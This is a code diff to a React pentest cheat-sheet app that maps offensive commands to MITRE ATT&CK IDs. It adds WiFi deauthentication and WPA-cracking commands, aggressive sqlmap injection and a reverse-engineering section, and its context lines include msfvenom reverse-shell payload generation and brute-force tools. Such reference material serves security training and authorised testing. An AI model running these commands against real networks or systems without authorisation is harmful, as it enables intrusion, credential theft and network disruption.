@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { BookOpen, Terminal, Network, Shield, Search, ChevronRight, Copy, Check, Server, Globe, Hash, CloudLightning, Zap, Wifi, Layers, FileCode, HardDrive, Share2, Unlock, Eye, Smartphone } from 'lucide-react';
+import { BookOpen, Terminal, Network, Shield, Search, ChevronRight, Copy, Check, Server, Globe, Hash, CloudLightning, Zap, Wifi, Layers, FileCode, HardDrive, Share2, Unlock, Eye, Smartphone, Radio, Cpu, Lock } from 'lucide-react';
 
 interface Command {
   cmd: string;
@@ -30,7 +30,8 @@ const cheatSheetData: Category[] = [
       { cmd: 'ghunt email <email>', desc: 'Extract Google Account details.', mitre: 'T1593' },
       { cmd: 'shodan host <ip>', desc: 'Retrieve host details from Shodan.', mitre: 'T1596' },
       { cmd: 'dig axfr @<ns> <domain>', desc: 'Attempt DNS Zone Transfer.', mitre: 'T1596' },
-      { cmd: 'whois <domain>', desc: 'Get registrar and registration info.', mitre: 'T1596' }
+      { cmd: 'whois <domain>', desc: 'Get registrar and registration info.', mitre: 'T1596' },
+      { cmd: 'dnsrecon -d <domain>', desc: 'Comprehensive DNS enumeration.', mitre: 'T1596' }
     ]
   },
   // 2. NETWORK SCANNING (Advanced)
@@ -60,13 +61,15 @@ const cheatSheetData: Category[] = [
       { cmd: 'gobuster dir -u <url> -w list.txt -x php,txt', desc: 'Directory brute-force.', mitre: 'T1595' },
       { cmd: 'ffuf -u <url>/FUZZ -w list.txt -mc 200,301', desc: 'Fast web fuzzer.', mitre: 'T1595' },
       { cmd: 'sqlmap -u "<url>" --batch --dbs', desc: 'Auto SQL Injection.', mitre: 'T1190' },
+      { cmd: 'sqlmap -r req.txt --level 5 --risk 3', desc: 'SQLi from saved request.', mitre: 'T1190' },
       { cmd: 'nikto -h <url>', desc: 'Web server vulnerability scanner.', mitre: 'T1595' },
       { cmd: 'wpscan --url <url> -e p,u', desc: 'WordPress plugin/user enum.', mitre: 'T1595' },
       { cmd: 'hydra -l user -P pass.txt <url> http-post-form', desc: 'Brute force login form.', mitre: 'T1110' },
-      { cmd: 'xsstrike -u "<url>"', desc: 'XSS Detection suite.', mitre: 'T1059' }
+      { cmd: 'xsstrike -u "<url>"', desc: 'XSS Detection suite.', mitre: 'T1059' },
+      { cmd: 'cewl -d 2 -w dict.txt <url>', desc: 'Scrape words for passwords.', mitre: 'T1056' }
     ]
   },
-  // 4. API SECURITY (New)
+  // 4. API SECURITY
   {
     id: 'api',
     name: 'API Security',
@@ -80,7 +83,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'zap-cli quick-scan -s xss,sqli <url>', desc: 'OWASP ZAP Quick Scan.', mitre: 'T1595' }
     ]
   },
-  // 5. MOBILE SECURITY (New)
+  // 5. MOBILE SECURITY
   {
     id: 'mobile',
     name: 'Mobile Security',
@@ -94,7 +97,22 @@ const cheatSheetData: Category[] = [
       { cmd: 'jadx-gui <apk>', desc: 'Static analysis of APK.', mitre: 'T1082' }
     ]
   },
-  // 6. EXPLOIT & VULNS (New)
+  // 6. WIRELESS SECURITY (New)
+  {
+    id: 'wireless',
+    name: 'Wireless Security',
+    icon: <Wifi size={18} />,
+    description: 'WiFi auditing and monitoring.',
+    commands: [
+      { cmd: 'airmon-ng start wlan0', desc: 'Enable monitor mode.', mitre: 'T1040' },
+      { cmd: 'airodump-ng wlan0mon', desc: 'Capture WiFi traffic.', mitre: 'T1040' },
+      { cmd: 'aireplay-ng --deauth 10 -a <bssid> wlan0mon', desc: 'Deauth attack (Handshake capture).', mitre: 'T1040' },
+      { cmd: 'aircrack-ng -w list.txt cap.cap', desc: 'Crack WPA handshake.', mitre: 'T1110' },
+      { cmd: 'wifite --kill', desc: 'Automated WiFi auditor.', mitre: 'T1040' },
+      { cmd: 'kismet -c wlan0mon', desc: 'Passive wireless sniffer.', mitre: 'T1040' }
+    ]
+  },
+  // 7. EXPLOIT & VULNS
   {
     id: 'exploit',
     name: 'Exploits & Vulns',
@@ -108,7 +126,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'msfvenom -p android/meterpreter/reverse_tcp ...', desc: 'Generate Android Payload.', mitre: 'T1059' }
     ]
   },
-  // 7. SHELLS & PAYLOADS
+  // 8. SHELLS & PAYLOADS
   {
     id: 'shells',
     name: 'Shells & Payloads',
@@ -124,7 +142,23 @@ const cheatSheetData: Category[] = [
       { cmd: 'msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php', desc: 'PHP Reverse Shell.', mitre: 'T1059' }
     ]
   },
-  // 8. PRIV ESCALATION (LINUX)
+  // 9. REVERSE ENGINEERING (New)
+  {
+    id: 'reverse',
+    name: 'Reverse Engineering',
+    icon: <Cpu size={18} />,
+    description: 'Binary analysis and debugging.',
+    commands: [
+      { cmd: 'strings <binary> | grep -i "pass"', desc: 'Extract readable strings.', mitre: 'T1082' },
+      { cmd: 'objdump -d <binary>', desc: 'Disassemble binary.', mitre: 'T1082' },
+      { cmd: 'strace <binary>', desc: 'Trace system calls.', mitre: 'T1082' },
+      { cmd: 'ltrace <binary>', desc: 'Trace library calls.', mitre: 'T1082' },
+      { cmd: 'radare2 -d <binary>', desc: 'Advanced CLI debugger.', mitre: 'T1082' },
+      { cmd: 'ghidra', desc: 'NSA Reverse Engineering Suite.', mitre: 'T1082' },
+      { cmd: 'gdb -q <binary>', desc: 'GNU Debugger.', mitre: 'T1082' }
+    ]
+  },
+  // 10. PRIV ESCALATION (LINUX)
   {
     id: 'privesc_linux',
     name: 'PrivEsc (Linux)',
@@ -138,7 +172,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'linpeas.sh', desc: 'Automated Enumeration Script.', mitre: 'T1082' }
     ]
   },
-  // 9. PRIV ESCALATION (WINDOWS)
+  // 11. PRIV ESCALATION (WINDOWS)
   {
     id: 'privesc_windows',
     name: 'PrivEsc (Windows)',
@@ -151,7 +185,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'winPEAS.exe', desc: 'Automated Enum Script.', mitre: 'T1082' }
     ]
   },
-  // 10. ACTIVE DIRECTORY
+  // 12. ACTIVE DIRECTORY
   {
     id: 'ad',
     name: 'Active Directory',
@@ -167,7 +201,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'kerbrute userenum -d <domain> users.txt', desc: 'Kerberos User Enum.', mitre: 'T1589' }
     ]
   },
-  // 11. FILE TRANSFER
+  // 13. FILE TRANSFER
   {
     id: 'file_transfer',
     name: 'File Transfer',
@@ -180,7 +214,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'impacket-smbserver share . -smb2support', desc: 'SMB Server.', mitre: 'T1040' }
     ]
   },
-  // 12. PIVOTING & TUNNELING
+  // 14. PIVOTING & TUNNELING
   {
     id: 'pivoting',
     name: 'Pivoting',
@@ -194,7 +228,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'proxychains nmap ...', desc: 'Route tool via proxy.', mitre: 'T1090' }
     ]
   },
-  // 13. CLOUD & CONTAINER
+  // 15. CLOUD & CONTAINER
   {
     id: 'cloud',
     name: 'Cloud & Docker',
@@ -207,7 +241,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'peirates', desc: 'K8s Pentest Tool.', mitre: 'T1613' }
     ]
   },
-  // 14. FORENSICS & BLUE TEAM
+  // 16. FORENSICS & BLUE TEAM
   {
     id: 'forensics',
     name: 'Forensics & Blue',
